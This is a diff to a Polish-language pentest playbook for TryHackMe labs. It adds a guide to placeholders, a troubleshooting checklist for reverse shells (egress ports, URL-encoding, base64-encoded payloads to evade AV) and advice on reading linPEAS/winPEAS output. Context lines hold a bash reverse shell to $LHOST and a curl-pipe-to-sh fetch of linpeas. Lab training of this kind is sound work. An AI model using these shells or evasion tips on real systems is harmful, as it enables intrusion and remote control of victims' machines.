@@ -44,7 +44,19 @@ export DOMAIN=tryhackme.loc
 export DC=10.211.11.10         # domain controller
 ```
 
-**Legenda placeholderów używanych niżej:** `TARGET_IP` = cel, `ATTACKER_IP`/`LHOST` = twoja maszyna, `DC` = kontroler domeny.
+### 📌 Jak czytać ten playbook — DWA rodzaje placeholderów
+> Nie wklejaj wszystkiego dosłownie — rozróżnij:
+>
+> **1. Zmienne powłoki (`$COŚ`)** — ustaw RAZ powyżej, potem komendy kopiujesz 1:1, powłoka podstawi wartość sama:
+> - `$IP` / `$ip` = **cel** (ten sam sens, playbook używa obu)
+> - `$LHOST` / `$lhost` / `<KALI>` / `ATTACKER_IP` = **Twoja maszyna** (tun0! sprawdź `ip a show tun0`, NIGDY 127.0.0.1)
+> - `$LPORT` = port Twojego listenera · `$DC` = kontroler domeny · `$DOMAIN` = domena · `$user` = znaleziony login
+>
+> **2. Placeholdery w `<nawiasach>` lub przykładowe nazwy (`./suidbin`, `<wolana_komenda>`, `<hash>`)** — to **RĘCZNIE podmieniasz** na realną wartość z maszyny. Powłoka ich NIE rozwinie.
+> - ❌ `strings ./suidbin` → `strings: './suidbin': No such file`
+> - ✅ `strings /usr/local/bin/backup` (wstaw prawdziwą ścieżkę SUID-a z `find`)
+>
+> Zasada: **`$mała/WIELKA` = zmienna (ustaw w §0)** · **`<coś>` / `./przykład` = wstaw ręcznie**.
 
 **Szybki start rozpoznania (odpal i idź parzyć kawę):**
 ```bash
@@ -677,6 +689,16 @@ fetch('/internal/secret')
 
 > Odpal listener na swojej maszynie **zanim** wywołasz payload: `nc -lvnp $LPORT` (lub `rlwrap nc -lvnp $LPORT` dla historii/edycji).
 
+> ### 🔧 Shell nie wpada? Checklist (przejdź po kolei)
+> 1. **Listener odpalony PRZED payloadem?** `nc -lvnp $LPORT` musi już nasłuchiwać.
+> 2. **Dobry `$LHOST`?** Musi być Twój **tun0** (VPN), nie eth0/127.0.0.1: `ip a show tun0`. Zły IP = shell idzie w próżnię.
+> 3. **Firewall celu blokuje wyjście?** Spróbuj portów, które prawie zawsze wychodzą: **443, 80, 53**. `$LPORT=443` bywa różnicą między „nic" a shellem.
+> 4. **Dochodzi w ogóle ruch?** Testuj kanałem: `sudo tcpdump -i tun0 icmp` + z celu `ping -c2 $LHOST`. Jest ICMP a nie ma TCP = firewall na port.
+> 5. **Payload w webie?** URL-enkoduj znaki specjalne: spacja=`%20`, `&`=`%26`, `|`=`%7C`, `>`=`%3E`. Nieenkodowane `>&` psuje payload.
+> 6. **`bash` nie ma / `nc -e` nie działa?** (OpenBSD nc) → weź inny wariant z listy niżej: `mkfifo`, `python`, `perl`, `sh`.
+> 7. **Wpada i od razu ginie?** Payload niestabilny → inny typ shella + od razu stabilizuj (§2.11).
+> 8. **Windows i AV zabija?** → payload `-enc` base64 (§2.14) albo inny loader; test na jednym porcie 443.
+
 ### Bash
 ```bash
 bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
@@ -1097,6 +1119,13 @@ curl -X PUT -d '{"password":"newpass"}' -H 'Content-Type: application/json' \
 curl http://$LHOST:8000/linpeas.sh | sh
 # alternatywy: pspy (podgląd procesów/cronów bez roota), LinEnum.sh
 ```
+> ### 🎨 Jak czytać peas (nie gub się w tysiącu linii)
+> - **`RED/YELLOW` (czerwone na żółtym) = ~95% wektor privesc.** Peas sam tak oznacza „prawie na pewno eksploatowalne". Na to patrz najpierw.
+> - **Czerwone** = interesujące/nietypowe. **Zielone** = stan OK/typowy (pomijaj).
+> - Zapisz output i przeglądaj z zachowaniem kolorów: `./linpeas.sh -a > peas.txt 2>&1` → `less -r peas.txt` (bez `-r` kolory to śmieci `[0;31m`).
+> - **Sekcje, w które celujesz (Linux):** `SUID` · `Capabilities` · `Sudo` (`sudo -l`) · `Cron jobs` · `Writable files/folders` · `Kernel Exploits (CVE)` · `Creds` (hasła w plikach/historii).
+> - **winPEAS (Windows), sekcje:** `whoami /priv` (SeImpersonate!) · `Services` (unquoted/weak perms) · `AlwaysInstallElevated` · `Stored Credentials` (cmdkey/Registry) · `Scheduled Tasks` · `AutoLogon`.
+> - ⚠️ Peas to **skaner tropów, nie dowód** — potwierdź ręcznie każdy znaleziony wektor. I odpal też manualne checki (niżej), bo peas nie łapie custom-binarek/logiki.
 
 ### System
 ```bash
